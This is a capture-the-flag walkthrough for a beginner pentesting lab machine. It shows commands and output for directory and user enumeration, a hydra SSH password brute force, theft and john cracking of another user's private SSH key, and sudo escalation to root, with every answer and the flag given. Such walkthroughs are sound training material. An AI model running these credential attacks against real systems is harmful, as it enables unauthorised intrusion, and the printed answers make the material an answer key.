# Web App Testing

### What is the name of the hidden directory on the web server(enter name without /)?
```
â”Œâ”€â”€(rootðŸ’€kali)-[~]
â””â”€# dirsearch -u "<machine ip>"
...
[21:20:50] 200 -    1KB - /development/
...
```
> *Answer:* development

### What is the username?
```
â”Œâ”€â”€(rootðŸ’€kali)-[~]
â””â”€# enum4linux <machine ip>
...
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
```
> *Answer:* jan

### What is the password?
```
â”Œâ”€â”€(rootðŸ’€kali)-[~]
â””â”€# hydra -l jan -P rockyou.txt ssh://<machine ip> -vV -f
...
[22][ssh] host: 10.10.21.222   login: jan   password: armando
...
```
> *Answer:* armando

### What service do you use to access the server(answer in abbreviation in all caps)?
> *Answer:* SSH

### What is the name of the other user you found(all lower case)?
> *Answer:* kay

### What is the final password you obtain?
```
â”Œâ”€â”€(rootðŸ’€kali)-[~]
â””â”€# ssh jan@<machine ip>
jan@10.10.21.222's password: (write armando here)
...
jan@basic2:~$ pwd
/home/jan
jan@basic2:~$ cd /home/kay
jan@basic2:/home/kay$ ls -la
total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
-rw------- 1 kay  kay   756 Apr 23  2018 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo
jan@basic2:/home/kay$ ls -la .ssh
total 20
drwxr-xr-x 2 kay kay 4096 Apr 23  2018 .
drwxr-xr-x 5 kay kay 4096 Apr 23  2018 ..
-rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys
-rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa
-rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub
jan@basic2:/home/kay$ cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75

IoNb/J0q2Pd56EZ23oAaJxLvhuSZ1crRr4ONGUAnKcRxg3+9vn6xcujpzUDuUtlZ
...
e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
3Jt1/ZW3XCb76R75sG5h6Q4N8gu5c/M0cdq16H9MHwpdin9OZTqO2zNxFvpuXthY
-----END RSA PRIVATE KEY-----
```
Copy id_rsa to inside kali.
```
â”Œâ”€â”€(rootðŸ’€kali)-[~]
â””â”€# python /usr/share/john/ssh2john.py id_rsa > id_rsa.john

â”Œâ”€â”€(rootðŸ’€kali)-[~]
â””â”€# john --wordlist=rockyou.txt id_rsa.john
...
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (id_rsa)
Warning: Only 1 candidate left, minimum 2 needed for performance.
...
```
SSH to machine with Kay.
```
jan@basic2:/home/kay$ ssh -i .ssh/id_rsa kay@<machine ip>
...
Enter passphrase for key '.ssh/id_rsa': (write beeswax here)
...
kay@basic2:~$ cat /home/kay/pass.bak
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```
> *Answer:* heresareallystrongpasswordthatfollowsthepasswordpolicy$$


<br><br>
# Privilege Escalation
```
kay@basic2:~$ sudo -l
[sudo] password for kay: (write heresareallystrongpasswordthatfollowsthepasswordpolicy$$ here)
Matching Defaults entries for kay on basic2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kay may run the following commands on basic2:
    (ALL : ALL) ALL
kay@basic2:~$ sudo su
root@basic2:/home/kay#
```

<h1 align="center">
  <img src="https://i2.wp.com/media4.giphy.com/media/mQG644PY8O7rG/giphy.gif" style="max-width:600px;">
</h1>

```
root@basic2:/home/kay# cd /root
root@basic2:~# ls -la
total 28
drwx------  3 root root 4096 Apr 23  2018 .
drwxr-xr-x 24 root root 4096 Apr 23  2018 ..
-rw-------  1 root root  510 Apr 23  2018 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r--  1 root root 1017 Apr 23  2018 flag.txt
drwxr-xr-x  2 root root 4096 Apr 18  2018 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
root@basic2:~# cat flag.txt
Congratulations! You've completed this challenge. There are two ways (that I'm aware of) to gain 
a shell, and two ways to privesc. I encourage you to find them all!

If you're in the target audience (newcomers to pentesting), I hope you learned something. A few
takeaways from this challenge should be that every little bit of information you can find can be
valuable, but sometimes you'll need to find several different pieces of information and combine
them to make them useful. Enumeration is key! Also, sometimes it's not as easy as just finding
an obviously outdated, vulnerable service right away with a port scan (unlike the first entry
in this series). Usually you'll have to dig deeper to find things that aren't as obvious, and
therefore might've been overlooked by administrators.

Thanks for taking the time to solve this VM. If you choose to create a writeup, I hope you'll send 
me a link! I can be reached at josiah@vt.edu. If you've got questions or feedback, please reach
out to me.

Happy hacking!
```

